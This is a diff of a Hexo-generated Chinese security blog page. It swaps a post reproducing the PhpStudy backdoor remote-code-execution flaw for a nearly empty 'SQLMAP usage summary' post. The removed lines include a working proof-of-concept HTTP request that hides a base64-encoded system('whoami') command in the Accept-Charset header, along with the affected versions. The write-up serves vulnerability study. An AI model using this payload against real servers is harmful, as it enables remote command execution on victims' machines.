@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>phpstudy远程代码执行复现 | WLSMILE Blog</title>
-  <meta name="keywords" content=" 漏洞复现 ">
-  <meta name="description" content="phpstudy远程代码执行复现 | WLSMILE Blog">
+  <title>SQLMAP使用总结 | WLSMILE Blog</title>
+  <meta name="keywords" content=" sqlmap ">
+  <meta name="description" content="SQLMAP使用总结 | WLSMILE Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="前言phpstudy是我的第一个环境，也是从大一就开始用到现在的环境，没想到李里面竟然隐藏了三年的木马。免杀三年，细思极恐啊。不过辛亏也只是自己实验用的环境，不是搭的公网的环境。  PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置">
 <meta name="keywords" content="漏洞复现">
@@ -268,9 +268,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-2" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">phpstudy远程代码执行复现</h1>
+        <h1 class="article-title">SQLMAP使用总结</h1>
     
     <div class="article-meta">
         
@@ -278,21 +278,21 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="杂项">杂项</a>
+                <a href="javascript:" data-rel="工具">工具</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color5">漏洞复现</a>
+            <a href="javascript:" class="color2">sqlmap</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-08 20:38:02'>2019-10-08 20:31</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-08 21:00:45'>2017-03-23 15:13</time>
         
     </div>
     <div class="article-meta">
@@ -314,7 +314,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-1"><span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#影响范围"><span class="toc-text">影响范围</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -330,29 +330,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpstudy是我的第一个环境，也是从大一就开始用到现在的环境，没想到李里面竟然隐藏了三年的木马。免杀三年，细思极恐啊。不过辛亏也只是自己实验用的环境，不是搭的公网的环境。</p>
-<blockquote>
-<p>PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接使用，具有PHP环境调试和PHP开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万PHP语言学习者、开发者用户。<br>然而，如此绿色无公害的“国民”开发软件遭到了黑客的毒手，并且犯罪动机竟然出自黑客的技痒和虚荣心。据杭州公安披露，黑客组织早在2016年就编写了“后门”文件，并非法侵入了PhpStudy的官网，篡改了软件安装包植入“后门”。而该“后门”具有控制计算机的功能，可以远程控制下载运行脚本实现用户个人信息收集。<br>从2016年起，黑客利用该“后门”犯罪作恶一发不可收拾，大量中招的电脑沦为“肉鸡”执行危险命令，不计其数的用户账号密码、电脑数据、敏感信息被远程抓取和回传。据统计，黑客已控制了超过67万台电脑，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，而此案也是2019年以来，国内影响最为严重的供应链攻击事件。</p>
-</blockquote>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>紧接着老大发来了POC，所以赶紧复现一波。</p>
-<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code>GET /110.php HTTP/1.1
-Host: 192.168.199.186
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.9
-Accept-Encoding:gzip,deflate
-Accept-Charset:c3lzdGVtKCd3aG9hbWknKTs=
-Cookie:UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
-Connection: close</code></pre><p><code>c3lzdGVtKCd3aG9hbWknKTs=这是你要执行的命令的base64加密，且请求报文除GET和Host外不能变动</code></p>
-<p>在访问正常已存在的php文件时抓包将POC中的数据替换到burp中发送即可</p>
-<p><img src="/images/2/1.png" alt><br>可以看到可以远程命令执行</p>
-<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>目前影响的版本为2016，2018中的</p>
-<pre><code>php-5.1.17 + Apache
-php-5.4.45 + Apache
-php-5.2.17 + Nginx
-</code></pre>
+        <pre><code></code></pre><p><img src="/images/1.png" alt="avatar"></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1102528985@qq.com </span>
     </div>
@@ -361,12 +340,12 @@ php-5.2.17 + Nginx
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>phpstudy远程代码执行复现</p>
+    <p><span class="copy-title">文章标题:</span>SQLMAP使用总结</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="WLSMILE">WLSMILE</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-08, 20:31:10</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-08, 20:38:02</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/08/2/" title="phpstudy远程代码执行复现">https://luckdogiii.github.io/2019/10/08/2/</a>
+    <p><span class="copy-title">发布时间:</span>2017-03-23, 15:13:47</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-08, 21:00:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2017/03/23/1/" title="SQLMAP使用总结">https://luckdogiii.github.io/2017/03/23/1/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
